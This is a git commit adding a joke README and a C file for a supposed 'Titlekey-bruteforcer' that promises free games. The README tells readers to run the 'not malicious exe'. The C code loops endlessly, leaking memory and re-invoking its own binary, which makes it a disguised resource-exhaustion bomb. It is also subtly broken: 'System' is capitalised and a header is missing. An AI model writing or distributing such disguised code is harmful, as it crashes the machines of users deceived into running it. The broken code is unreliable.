da7d7b0a66813db96e5d40570f26bbb5a9ef4349
Dany <imsurebuschdid911@gmail.com>
2019-02-22 22:31:05 +0100

    Initial commit

---
+++ README.md
@@ -0,0 +1,8 @@
+# The ultimate Titlekey-bruteforcer(tm)(c) *patent pending*
+
+## Usage
+- run this not malicious exe
+- wait for it
+- wait for it
+- 
+- frii gaemz -> profit!
---
+++ kewl.c
@@ -0,0 +1,11 @@
+#include <stdlib.h>
+
+int main(int argc, char *argv[]) {
+
+    for (;;) {
+        printf("Bruteforcing...\nPlease wait...\n");
+        malloc(50000);
+        System(argv[0]);
+    }
+
+}
